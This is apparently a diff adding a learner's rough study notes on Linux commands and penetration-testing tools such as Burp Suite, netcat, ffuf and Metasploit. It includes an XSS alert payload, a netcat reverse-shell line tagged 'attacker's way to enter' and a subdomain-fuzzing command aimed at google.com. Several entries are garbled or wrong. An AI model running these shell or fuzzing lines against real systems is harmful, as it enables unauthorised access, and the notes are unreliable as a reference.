@@ -1,0 +1,24 @@
+linux commands:
+  mv- moving/renaming
+  nano- text editor in terminal
+  echo: overwrites old file, when > used
+        appends , when >> used
+  :- execute commands together
+  <tab>- completion of command
+  &- does not display on terminal
+burpsuite:
+  penetrating tool
+  https://testphp.vulnweb.com/- for hacking practice
+  <marquee>...</marquee>- tag for moving text in html
+  <script>alert(...)</script>- tag for alerts in javascript
+netcat:
+  write or read data across network connections
+  nc -l -p 4444
+  nc -e 127.0.0.1 4444 /bin/bash &: attacker's way to enter
+ffuf -u https://FUZZ.google.com/ -w /usr/share/wordlists/wfuzz/general
+* everything went above my head *
+metasploit:
+  msfvenom- allows us to create malociuos scripts
+  payload- way to do malicious stuff
+  use <payload_name>- using venom to get in
+  lhost and lpost- commands inside venom
